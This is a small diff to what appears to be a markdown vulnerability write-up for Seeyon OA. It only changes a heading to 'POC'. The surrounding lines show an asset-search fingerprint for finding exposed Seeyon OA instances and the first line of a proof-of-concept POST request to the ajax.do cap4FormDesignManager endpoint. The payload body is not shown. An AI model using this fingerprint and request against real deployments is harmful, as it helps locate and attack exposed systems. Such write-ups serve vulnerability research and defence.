@@ -8,7 +8,7 @@
 app="致远互联-OA"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /seeyon/ajax.do?method=ajaxAction&managerName=cap4FormDesignManager HTTP/1.1
